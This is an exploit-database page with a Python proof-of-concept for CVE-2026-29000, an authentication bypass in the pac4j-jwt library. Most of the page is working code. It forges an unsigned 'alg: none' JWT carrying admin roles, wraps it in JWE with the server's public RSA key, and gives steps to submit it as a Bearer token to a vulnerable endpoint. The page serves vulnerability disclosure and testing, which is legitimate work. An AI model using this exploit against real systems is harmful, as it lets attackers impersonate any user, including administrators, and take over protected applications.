---
title: pac4j-jwt <  4.5.9, <  5.7.9, <  6.3.3 JwtAuthenticator Authentication Bypass via JWE-wrapped PlainJWT
url: https://cxsecurity.com/issue/WLB-2026030011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-08
fetch_date: 2026-03-09T04:08:04.840562
---

# pac4j-jwt <  4.5.9, <  5.7.9, <  6.3.3 JwtAuthenticator Authentication Bypass via JWE-wrapped PlainJWT

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **pac4j-jwt < 4.5.9, < 5.7.9, < 6.3.3 JwtAuthenticator Authentication Bypass via JWE-wrapped PlainJWT** **2026.03.08**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-29000](https://cxsecurity.com/cveshow/CVE-2026-29000/ "Click to see CVE-2026-29000")**  CWE: **[CWE-347 (Improper Verification of Cryptographic Signature)](https://cxsecurity.com/cwe/CWE-347%20%28Improper%20Verification%20of%20Cryptographic%20Signature%29 "Click to see CWE-347 (Improper Verification of Cryptographic Signature)")** | |

#!/usr/bin/env python3
# Exploit Title: pac4j-jwt < 4.5.9, < 5.7.9, < 6.3.3 JwtAuthenticator Authentication Bypass via JWE-wrapped PlainJWT
# CVE: CVE-2026-29000
# Date: 2026-03-05
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://www.pac4j.org
# Software Link: https://github.com/pac4j/pac4j
# Affected: pac4j-jwt < 4.5.9, < 5.7.9, < 6.3.3
# Tested on: Python 3.12 with pyjwt + cryptography
# Category: Remote Authentication Bypass
# Platform: Java (pac4j-jwt library)
# Exploit Type: Proof of Concept
# CVSS: 10.0 (Critical)
# CWE : CWE-347 (Improper Verification of Cryptographic Signature)
# Description: Allows remote attackers with only the server's RSA public key to forge authentication tokens by wrapping an unsigned PlainJWT in JWE (RSA-OAEP-256 + A256GCM), bypassing signature verification and impersonating any user (including admins).
# Fixed in: pac4j-jwt 4.5.9, 5.7.9, 6.3.3+
# Usage:
# python3 exploit.py
#
# Examples:
# python3 exploit.py
#
# Options:
# (No command-line args needed in this standalone PoC version)
#
# Notes:
# - Requires: pip install pyjwt cryptography
# - This generates a malicious token locally; in a real attack you'd fetch the public key from the target's JWKS endpoint.
# - For demo only — use responsibly and only on systems you own or have explicit permission to test.
#
# How to Use
#
# Step 1: Run the script to generate a malicious JWE token
# Step 2: Submit the token in an Authorization: Bearer <token> header to a vulnerable pac4j-jwt protected endpoint
print(r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ▄▄▄▄· ▄▄ . ▄▄ • ▄▄▄▄▄ ▄▄ ▄▄▄· ▄▄▄· ▄▄▄▄▄▄▄▄▄ .▄▄▄ ▄• ▄▌ ║
║ ▐█ ▀█▪▀▄.▀·▐█ ▀ ▪•██ ▪ ▀▄ █·▐█ ▀█ ▐█ ▄█•██ ▀▀▄.▀·▀▄ █·█▪██▌ ║
║ ▐█▀▀█▄▐▀▀▪▄▄█ ▀█ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██▀· ▐█.▪▐▀▀▪▄▐▀▀▄ █▌▐█· ║
║ ██▄▪▐█▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐█▪·• ▐█▌·▐█▄▄▌▐█•█▌▐█▄█▌ ║
║ ·▀▀▀▀ ▀▀▀ ·▀▀▀▀ ▀▀▀ ▀█▄▀▪.▀ ▀ ▀ ▀ .▀ ▀▀▀ ▀▀▀ .▀ ▀ ▀▀▀ ║
║ ║
║ b a n y a m e r \_ s e c u r i t y ║
║ ║
║ >>> Silent Hunter • Shadow Presence <<< ║
║ ║
║ Operator : Mohammed Idrees Banyamer Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ CVE-2026-29000 • pac4j-jwt → Auth Bypass via Public Key ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
""")
import json
from datetime import datetime, timedelta, timezone
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.padding import OAEP
from cryptography.hazmat.primitives.hashes import SHA256
from cryptography.hazmat.backends import default\_backend
import jwt
private\_key = rsa.generate\_private\_key(
public\_exponent=65537,
key\_size=2048,
backend=default\_backend()
)
public\_key = private\_key.public\_key()
public\_pem = public\_key.public\_bytes(
encoding=serialization.Encoding.PEM,
format=serialization.PublicFormat.SubjectPublicKeyInfo
).decode('utf-8')
print("[+] Public key (PEM) that attacker would use:\n")
print(public\_pem)
malicious\_claims = {
"sub": "admin#override",
"email": "attacker@evil.com",
"$int\_roles": ["ROLE\_ADMIN", "ROLE\_SUPERUSER"],
"iat": int(datetime.now(timezone.utc).timestamp()),
"exp": int((datetime.now(timezone.utc) + timedelta(hours=1)).timestamp())
}
print("\n[+] Malicious claims:")
print(json.dumps(malicious\_claims, indent=2))
header = {
"alg": "none",
"typ": "JWT"
}
payload = jwt.utils.base64url\_encode(json.dumps(malicious\_claims).encode()).decode()
unsigned\_jwt = (
jwt.utils.base64url\_encode(json.dumps(header).encode()).decode()
+ "."
+ payload
+ "."
)
print("\n[+] Unsigned PlainJWT (inner token):\n" + unsigned\_jwt)
jwe\_header = {
"alg": "RSA-OAEP-256",
"enc": "A256GCM",
"typ": "JWE",
"cty": "JWT"
}
protected = jwt.utils.base64url\_encode(json.dumps(jwe\_header).encode()).decode()
cek = jwt.utils.generate\_key(32)
encrypted\_key = public\_key.encrypt(
cek,
OAEP(
mgf=OAEP.MGF1(algorithm=SHA256()),
algorithm=SHA256(),
label=None
)
)
encrypted\_key\_b64 = jwt.utils.base64url\_encode(encrypted\_key).decode()
iv = jwt.utils.generate\_key(12)
ciphertext, tag = jwt.algorithms.AESGCM(cek).encrypt(
nonce=iv,
data=unsigned\_jwt.encode(),
associated\_data=protected.encode()
)
iv\_b64 = jwt.utils.base64url\_encode(iv).decode()
ciphertext\_b64 = jwt.utils.base64url\_encode(ciphertext).decode()
tag\_b64 = jwt.utils.base64url\_encode(tag).decode()
jwe\_token = (
protected + "."
+ encrypted\_key\_b64 + "."
+ iv\_b64 + "."
+ ciphertext\_b64 + "."
+ tag\_b64
)
print("\n[+] Malicious JWE token (submit this to vulnerable pac4j-jwt):\n")
print(jwe\_token)
print("\n(length: {} chars)".format(len(jwe\_token)))

**##### References:**

https://www.pac4j.org/blog/security-advisory-pac4j-jwt-jwtauthenticator.html

https://www.vulncheck.com/advisories/pac4j-jwt-jwtauthenticator-authentication-bypass

https://www.codeant.ai/security-research/pac4j-jwt-authentication-bypass-public-key

https://nvd.nist.gov/vuln/detail/CVE-2026-29000

(once published)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030011)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
...